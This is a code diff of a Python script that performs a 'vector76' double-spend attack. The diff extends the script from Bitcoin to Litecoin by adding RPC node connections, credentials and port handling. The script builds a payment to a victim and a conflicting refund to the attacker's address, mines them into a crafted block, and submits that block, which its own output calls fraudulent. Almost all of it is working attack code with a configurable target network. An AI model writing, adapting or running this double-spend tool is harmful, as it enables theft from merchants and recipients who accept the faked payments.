@@ -4,10 +4,15 @@ import requests
 import subprocess
 import cryptos
 import subprocess
+import json
+import litecoin.rpc
+from litecoinutils.keys import PrivateKey
 
+
+from bitcoincli import Bitcoin
 from bs4 import BeautifulSoup
 
-parser = argparse.ArgumentParser(description="How To use vector76")
+parser = argparse.ArgumentParser(description="How To use vector76_ltc")
 
 parser.add_argument("from_wifkey",
                     help="Fake send btc from wif key.",
@@ -16,30 +21,40 @@ parser.add_argument("send_to",
                     help="Fake send btc to address.",
                     type=str)
 parser.add_argument("attacker_address",
-                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated",
+                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address fthat can be generated",
                     type=str)
 parser.add_argument("amount_of_coins",
-                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
+                    help="Amount of coins sent. (Enter in LTC units) The maximum amount delayed will vary depending on send_from.",
                     type=float)
+parser.add_argument("--symbol",
+                    help="coin symbol btc or ltc (Default = btc)",
+                    type=str)
 parser.add_argument("--is_testnet",
                     "-test",
                     help="Testnet flag (Default=True)",
                     default=True,
                     type=bool)
+parser.add_argument("--username",
+                    "-u",
+                    help="conf username",
+                    type=str)
+parser.add_argument("--password",
+                    "-p",
+                    help="conf password",
+                    type=str)
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
-
 def generate_block(address, block, submit=False):
-    subprocess.run(f'bitcoin-cli generateblock "{address}" \'["{block}"]\' {str(submit).lower()}',
+    subprocess.run(f'litecoin-cli generateblock "{address}" \'["{block}"]\' {str(submit).lower()}',
                              shell=True,
                              capture_output=True,
                              text=True,
                              check=True)
 
 def send_rawtransaction(hextx):
-    result = subprocess.run(f'bitcoin-cli sendrawtransaction {hextx}',
+    result = subprocess.run(f'litecoin-cli sendrawtransaction {hextx}',
                              shell=True,
                              capture_output=True,
                              text=True,
@@ -47,7 +62,7 @@ def send_rawtransaction(hextx):
     return result.stdout
 
 def submit_block(block):
-    subprocess.run(f'bitcoin-cli submitblock {block}',
+    subprocess.run(f'litecoin-cli submitblock {block}',
                              shell=True,
                              capture_output=True,
                              text=True,
@@ -90,12 +105,42 @@ victim_address   = args.send_to
 attacker_address = args.attacker_address
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
+coin_symbol = args.symbol
+username    = args.username
+password    = args.password
 
+if testnet:
+    print("testnet mode")
+port     = 8332
+if testnet:
+    port     = 18332 # testnet ltc port
+
+if "ltc" == coin_symbol:
+    port = 9332
+    if testnet:
+        port = 19332
+
+hostname = f"127.0.0.1:{port}"
+node = Bitcoin(rpcuser=username,
+               rpcpasswd=password,
+               rpchost=hostname,
+               rpcport=port)
 transaction_util = cryptos.Bitcoin(testnet=testnet)
+if coin_symbol == "ltc":
+    node = litecoin.rpc.Proxy(service_url=f"http://{username}:{password}@{hostname}",
+                              service_port=port)
+    transaction_util = cryptos.Litecoin(testnet=testnet)
+    print(fake_send_from)
+    sender  = transaction_util.privtopub(fake_send_from)
+    address = transaction_util.pubtoaddr(sender)
+    balance = transaction_util.get_balance(address)
+    inputs  = transaction_util.get_unspents(address)
+else:
+    balance = transaction_util.get_balance(transaction_util.privtoaddr(fake_send_from))
+    inputs  = transaction_util.get_unspents(transaction_util.privtoaddr(fake_send_from))
+
 print("OK")
-balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
-inputs  = transaction_util.get_unspents(transaction_util.wiftoaddr(fake_send_from))
-print(inputs)
+print(balance)
 if balance["confirmed"] <= 0:
     balance = balance["unconfirmed"]
 else:
@@ -123,7 +168,12 @@ vector76 = f"{tx_attacker}{tx_victim}"
 vector76_block   = cryptos.serialize(transaction_util.signall(cryptos.deserialize(vector76), fake_send_from))
 
 print("Generating vector76 Block...")
-data = generate_block(transaction_util.wiftoaddr(fake_send_from), vector76_block)
+
+payload = [attacker_address,
+                     [vector76_block]]
+payload = json.dumps(payload)
+
+data = node.call("generateblock", payload)
 print(data)
 print()
 print("[+] READY...")
@@ -131,7 +181,7 @@ print()
 print()
 print("--------------------")
 print(f"Send to                       : {victim_address}")
-print(f"Send Amount (Satoshi unit)    : {send_amount} Satoshi")
+print(f"Send Amount   (Satoshi unit)  : {send_amount} Satoshi")
 print(f"Signed victim   Signed RawTx  : {tx_victim}")
 print(f"Signed attacker Signed RawTx  : {tx_attacker}")
 print(f"Signed vector76 Signed RawTx  : {vector76_block}")
@@ -156,6 +206,7 @@ print()
 time.sleep(0.7)
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
 print()
+node.call("submitblock", data)
 time.sleep(0.7)
 #transaction_util.pushtx(vector76_block)
 print("Submit Block ...")
